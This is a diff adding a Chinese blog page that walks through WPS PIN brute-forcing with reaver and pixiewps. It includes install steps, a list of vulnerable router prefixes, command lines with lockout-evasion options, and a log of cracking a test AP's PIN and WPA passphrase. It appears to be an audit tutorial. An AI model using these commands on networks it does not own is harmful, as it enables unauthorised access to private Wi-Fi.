@@ -1,0 +1,749 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="信息安全,无线安全," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> 利用 reaver 进行无线安全审计 // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              利用 reaver 进行无线安全审计
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2015-08-19
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2015/08/19/reaver-tutorial/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/19/reaver-tutorial/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <h1 id="背景">背景</h1><p>就在距离2012还有几天的2011年底，安全研究员Stefan Viehbock在其博客上公布了WPS存在着安全漏洞，而且涉及了多家厂商的大量的无线设备。由于该漏洞的细节已经公开。换句话说，黑客们也已经知道了这个安全漏洞，并将毫无疑问地利用该漏洞进行攻击。因此美国计算机应急准备小组(US-CERT)警告说，数以百万计的家庭无线路由器将有可能面临被黑客破解网络密码[3]。</p>
+<p>在此消息发布后，Tactical Network Solutions（TNS）安全公司表示早在一年之前，他们就已经发现了该漏洞，但出于漏洞涉及面广的考量并未公布。但现在出于宣传目的，TNS放出了免费版的PIN码破解工具（即为reaver）[3]。</p>
+<p>4年后的今天，reaver似乎已经由Kali社区的t6x接手，在最新的1.5.2版本中使用 <code>-K 1</code> 参数整合了pixiewps，极大加快枚举PIN的速度。</p>
+<h1 id="测试环境">测试环境</h1><p>系统 Ubuntu Kylin 14.04 32bit<br>网卡 TP-LINK TL-WN722N<br>路由器 FAST FW150R</p>
+<h1 id="Dust_Attack_受影响芯片列表">Dust Attack 受影响芯片列表</h1><p>不是都通用，受影响的有老款雷凌芯片的ap、少量博通芯片的ap、atheros芯片的ap不受影响<br>TP-LINK用atheros芯片的比较多,基本没用</p>
+<p>可以破解的的版本有以下几种,更多详细列表参阅[5]</p>
+<blockquote>
+<p>62：6B：D3 EchoLife HG556a vodafoneXXXX<br>62：53：D4 EchoLife HG556a vodafoneXXXX<br>62：CB：A8 華為vodafoneXXXX<br>6A：23：3D 華為vodafoneXXXX<br>72：23：3D 華為vodafoneXXXX<br>72：3D：FF 華為vodafoneXXXX<br>72：55：9C ？  vodafoneXXXX</p>
+<p>0C：96：BF 雷凌橙色-XXXX<br>08：7A：4C 雷凌橙色-XXXX<br>20：08：ED 華為橙色-XXXX<br>D0：7A：B5 HG532s橙色-XXXX<br>E8：CD：2D HG530s橙色-XXXX </p>
+<p>00：A0：26 iRouter 1104-W WLAN_XXXX<br>C8：D3：A3 D-link的MOVISTAR_XXXX<br>B2：46：FC MOVISTAR_XXXX </p>
+<p>5C：35：3B 寬帶ONOXXXX<br>DC：53：7C 仁寶ONOXXXX </p>
+<p>6C：B0：CE 美國網件EX2700</p>
+</blockquote>
+<h1 id="安装_reaver_1-5-2">安装 reaver 1.5.2</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github<span class="class">.com</span>:t6x/reaver-wps-fork-t6x<span class="class">.git</span> ./reaver15</span><br><span class="line"></span><br><span class="line">cd reaver15/src</span><br><span class="line"></span><br><span class="line">chmod <span class="number">777</span> configure</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">`</span><br></pre></td></tr></table></figure>
+<h1 id="安装_pixiewps">安装 pixiewps</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github<span class="class">.com</span>:wiire/pixiewps<span class="class">.git</span> ./pixiewps</span><br><span class="line"></span><br><span class="line">cd pixiewps/src</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+<h1 id="结合_dust_attack_的_reaver">结合 dust attack 的 reaver</h1><p>需要添加 -K 1 参数</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo reaver -i mon0 -b <span class="string">EC:</span><span class="number">88</span>:<span class="number">8</span><span class="string">F:</span><span class="string">A1:</span><span class="string">A5:</span><span class="number">90</span> -K <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h1 id="reaver_命令详解">reaver 命令详解</h1><p>以一个命令的参数详解[13]来举例解释吧。</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo reaver -i mon0 -b <span class="string">EC:</span><span class="number">88</span>:<span class="number">8</span><span class="string">F:</span><span class="string">A1:</span><span class="string">A5:</span><span class="number">90</span> -vv -N -L -d <span class="number">60</span> -r <span class="number">3</span>:<span class="number">15</span> -T .<span class="number">5</span> -x <span class="number">360</span> -s EC888FA1A590.wpc</span><br></pre></td></tr></table></figure>
+<p><code>-i</code> 指定 interface</p>
+<p><code>-b</code> 目标的bssid ,即为目标AP的MAC地址 </p>
+<p><code>-vv</code> 提供更详细的输出log</p>
+<p><code>-N</code> 不发送NACK信息（如果一直pin不动，可以尝试这个参数）</p>
+<p><code>-L</code> 忽略目标AP报告的锁定状态</p>
+<p><code>-d 60</code> –delay= Set the delay between pin attempts<br>        pin间延时，默认1秒,设置要看具体路由器的安全功能</p>
+<p><code>-r 3:15</code> –recurring-delay= Sleep for y seconds every x pin attempts<br>每x次pin后等待y秒，例子是每3次pin等待15秒</p>
+<p><code>-T .5</code> -T, –m57-timeout= Set the M5/M7 timeout period [0.20] M5/M7超时，默认0.2秒</p>
+<p><code>-x 360</code> -x, –fail-wait= Set the time to sleep after 10 unexpected failures 10次意外失败后等待时间，默认0秒</p>
+<p><code>-s EC888FA1A590.wpc</code> -s, –session= Restore a previous session file<br>从文件恢复暴力搜索进度</p>
+<p>一段成功的 log ，花费了大概 3～4天 的时间，每天 pin 几个小时，如果路由器被锁就休息。</p>
+<p>这段log 表示 后三位 由 070 一直 pin 到 079。<br>PIN 的最后一位是校验和，可以由前七位导出。</p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] <span class="number">91.63</span>% complete @ <span class="number">2015</span><span class="number">-08</span><span class="number">-14</span> <span class="number">15</span>:25:30 <span class="list">(<span class="keyword">67</span> seconds/pin)</span></span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Trying pin <span class="number">16030701</span></span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending EAPOL START request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received identity request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending identity response</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M1 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M2 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M3 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M4 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M5 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M6 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Entering recurring delay of <span class="number">15</span> seconds</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Trying pin <span class="number">16030718</span></span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending EAPOL START request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received identity request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending identity response</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M1 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M2 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M3 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M4 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M5 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M6 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Trying pin <span class="number">16030725</span></span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending EAPOL START request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received identity request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending identity response</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M1 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M2 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M3 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M4 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M5 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M6 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Trying pin <span class="number">16030732</span></span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending EAPOL START request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received identity request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending identity response</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M1 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M2 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M3 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M4 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M5 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M6 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Entering recurring delay of <span class="number">15</span> seconds</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Trying pin <span class="number">16030749</span></span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending EAPOL START request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received identity request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending identity response</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M1 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M2 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M3 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M4 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M5 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M6 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] <span class="number">91.67</span>% complete @ <span class="number">2015</span><span class="number">-08</span><span class="number">-14</span> <span class="number">15</span>:31:11 <span class="list">(<span class="keyword">67</span> seconds/pin)</span></span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Trying pin <span class="number">16030756</span></span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending EAPOL START request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received identity request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending identity response</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M1 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M2 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M3 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M4 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M5 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M6 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Trying pin <span class="number">16030763</span></span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending EAPOL START request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received identity request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending identity response</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M1 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M2 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M3 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M4 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M5 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M6 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Entering recurring delay of <span class="number">15</span> seconds</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Trying pin <span class="number">16030770</span></span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending EAPOL START request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received identity request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending identity response</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M1 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M2 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M3 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M4 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M5 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M6 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Trying pin <span class="number">16030787</span></span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending EAPOL START request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received identity request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending identity response</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M1 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M2 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M3 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M4 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M5 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M6 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Trying pin <span class="number">16030794</span></span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending EAPOL START request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received identity request</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending identity response</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M1 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M2 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M3 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M4 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M5 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending M6 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Received M7 message</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Sending WSC NACK</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] <span class="number">100.00</span>% complete @ <span class="number">2015</span><span class="number">-08</span><span class="number">-14</span> <span class="number">15</span>:36:37 <span class="list">(<span class="keyword">67</span> seconds/pin)</span></span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] Pin cracked in <span class="number">13517</span> seconds</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] WPS PIN: <span class="variable">'16030794</span>'</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] WPA PSK: <span class="variable">'robinlyh123!321</span>'</span><br><span class="line"><span class="list">[<span class="keyword"><span class="built_in">+</span></span>] AP SSID: <span class="variable">'crack_me</span>'</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br></pre></td></tr></table></figure>
+<h1 id="可能遇到的问题">可能遇到的问题</h1><h2 id="WPS_transaction_failed_(code:_0x04)">WPS transaction failed (code: 0x04)</h2><p>刚打开 reaver 就一直报出 WPS transaction failed (code: 0x04) 的错误。</p>
+<p>解决:libpcap0.8 版本回退</p>
+<p>参考[12]</p>
+<p>里面提到的两个包 libpcap0.8_1.4.0-2_amd64.deb 与 libpcap0.8-dev_1.4.0-2_amd64.deb 还是非常难找的，不过还好论坛原帖有提供下载。我在<a href="http://pkgs.org/" target="_blank" rel="external">其他地方</a>只找到过更高或者更低的版本。</p>
+<h2 id="0x02与0x03混合报错">0x02与0x03混合报错</h2><p>The 0x02 and 0x03 codes are just re-iterating the messages that you are already seeing: receive timeouts and out of order packets respectively. Without seeing the pcap it’s hard to say what the problem might be, but you might try the —no-nacks option which will prevent Reaver from instantly NACKing out of order packets.</p>
+<h2 id="长期警告无法Associate">长期警告无法Associate</h2><blockquote>
+<p>[+] Waiting for beacon from 50:BD:5F:63:48:32<br>[!] WARNING: Failed to associate with 50:BD:5F:63:48:32 (ESSID: TESTWIFI)</p>
+</blockquote>
+<p>AP 未开启 WPS 功能 或 不支持 WPS 功能</p>
+<h2 id="长期警告_Receive_timeout">长期警告 Receive timeout</h2><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Reaver v1.4 WiFi Protected Setup Attack Tool</span><br><span class="line">Copyright (c) 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">[+]</span> Waiting for beacon from EC:88:8F:A1:A5:90</span><br><span class="line"><span class="comment">[+]</span> Switching mon0 to channel 6</span><br><span class="line"><span class="comment">[+]</span> Switching mon0 to channel 1</span><br><span class="line"><span class="comment">[+]</span> Switching mon0 to channel 2</span><br><span class="line"><span class="comment">[+]</span> Switching mon0 to channel 3</span><br><span class="line"><span class="comment">[+]</span> Switching mon0 to channel 4</span><br><span class="line"><span class="comment">[+]</span> Switching mon0 to channel 5</span><br><span class="line"><span class="comment">[+]</span> Switching mon0 to channel 6</span><br><span class="line"><span class="comment">[+]</span> Associated with EC:88:8F:A1:A5:90 (ESSID: crack_me)</span><br><span class="line"><span class="comment">[+]</span> Trying pin 12345670</span><br><span class="line"><span class="comment">[+]</span> Sending EAPOL START request</span><br><span class="line"><span class="comment">[!]</span> WARNING: Receive timeout occurred</span><br><span class="line"><span class="comment">[+]</span> Sending EAPOL START request</span><br><span class="line"><span class="comment">[!]</span> WARNING: Receive timeout occurred</span><br><span class="line"><span class="comment">[+]</span> Sending EAPOL START request</span><br><span class="line"><span class="comment">[!]</span> WARNING: Receive timeout occurred</span><br><span class="line"><span 